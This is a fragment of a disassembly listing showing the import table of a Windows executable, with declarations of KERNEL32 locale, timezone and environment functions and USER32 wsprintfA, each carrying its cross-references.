		extrn GetStringTypeW:dword ; CODE XREF:	___crtGetStringTypeA+3Fp
					; ___crtGetStringTypeA+12Dp ...
; LONG __stdcall InterlockedDecrement(volatile LONG *lpAddend)
		extrn InterlockedDecrement:dword ; CODE	XREF: _toupper+3Bp
					; _toupper+65p	...
; LONG __stdcall InterlockedIncrement(volatile LONG *lpAddend)
		extrn InterlockedIncrement:dword ; CODE	XREF: _toupper+26p
					; sub_409A62+14p ...
; BOOL __stdcall IsValidLocale(LCID Locale, DWORD dwFlags)
		extrn IsValidLocale:dword ; CODE XREF: ___get_qualified_locale+FAp
					; DATA XREF: ___get_qualified_locale+FAr ...
; BOOL __stdcall IsValidCodePage(UINT CodePage)
		extrn IsValidCodePage:dword ; CODE XREF: ___get_qualified_locale+E4p
					; DATA XREF: ___get_qualified_locale+E4r ...
; int __stdcall	GetLocaleInfoA(LCID Locale, LCTYPE LCType, LPSTR lpLCData, int cchData)
		extrn GetLocaleInfoA:dword ; CODE XREF:	crtGetLocaleInfoA(x,x,x,x)+41p
					; ___crtGetLocaleInfoW+49p ...
; BOOL __stdcall EnumSystemLocalesA(LOCALE_ENUMPROCA lpLocaleEnumProc, DWORD dwFlags)
		extrn EnumSystemLocalesA:dword ; CODE XREF: _GetLcidFromLangCountry+66p
					; _GetLcidFromLanguage+3Fp ...
; LCID __stdcall GetUserDefaultLCID()
		extrn GetUserDefaultLCID:dword ; CODE XREF: _GetLcidFromDefault+9p
					; DATA XREF: _GetLcidFromDefault+9r ...
; DWORD	__stdcall GetTimeZoneInformation(LPTIME_ZONE_INFORMATION lpTimeZoneInformation)
		extrn GetTimeZoneInformation:dword ; CODE XREF:	__tzset_lk+4Ep
					; DATA XREF: __tzset_lk+4Er ...
; int __stdcall	GetLocaleInfoW(LCID Locale, LCTYPE LCType, LPWSTR lpLCData, int	cchData)
		extrn GetLocaleInfoW:dword ; CODE XREF:	___crtGetLocaleInfoW+36p
					; ___crtGetLocaleInfoW+70p ...
; BOOL __stdcall SetEnvironmentVariableA(LPCSTR	lpName,	LPCSTR lpValue)
		extrn SetEnvironmentVariableA:dword ; CODE XREF: ___crtsetenv+173p
					; DATA XREF: ___crtsetenv+173r	...

;
; Imports from USER32.dll
;
; int wsprintfA(LPSTR, LPCSTR, ...)
		extrn wsprintfA:dword	; CODE XREF: sub_4010A0+1Ap
					; sub_4010A0+28p ...



		end start
